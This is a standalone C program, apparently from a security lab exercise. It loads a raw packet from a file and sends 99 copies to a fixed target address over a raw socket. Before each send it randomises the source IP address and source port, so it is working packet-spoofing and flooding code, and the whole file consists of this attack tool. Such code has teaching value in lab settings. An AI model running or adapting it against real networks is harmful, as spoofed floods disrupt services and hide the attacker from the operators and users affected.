#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_FILE_SIZE   2000
#define TARGET_IP "10.0.2.69" 

int send_packet_raw (int sock, char *ip, int n);

int main()
{
  // Create raw socket
  int enable = 1;
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));      

  // Read the UDP packet from file
  FILE *f = fopen("ip.bin", "rb");
  if (!f) {
    perror("Can't open 'ip.bin'");
    exit(0);
  } 
  unsigned char ip[MAX_FILE_SIZE];
  int n = fread(ip, 1, MAX_FILE_SIZE, f);
  printf("Total IP packet size: %d\n", n);

  // Modify and send out UDP packets
  srand(time(0)); // Initialize the seed for random # generation
  for (int i=1; i<100; i++){
    printf("%d\n", i);
    unsigned short src_port; 
    unsigned int  src_ip; 

    src_ip  = htonl(rand());
    memcpy(ip+12, &src_ip , 4);   // modify source IP

    src_port = htons(rand());
    memcpy(ip+20, &src_port, 2);  // modify soruce port

    send_packet_raw(sock, ip, n); // send packet
  }
  close(sock);
}

int send_packet_raw(int sock, char *ip, int n)
{
  struct sockaddr_in dest_info;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr.s_addr = inet_addr(TARGET_IP);

  int r = sendto(sock, ip, n, 0, (struct sockaddr *)&dest_info, 
                 sizeof(dest_info));
  if (r>=0) printf("Sent a packet of size: %d\n", r);
  else printf("Failed to send packet. Did you run it using sudo?\n");
}



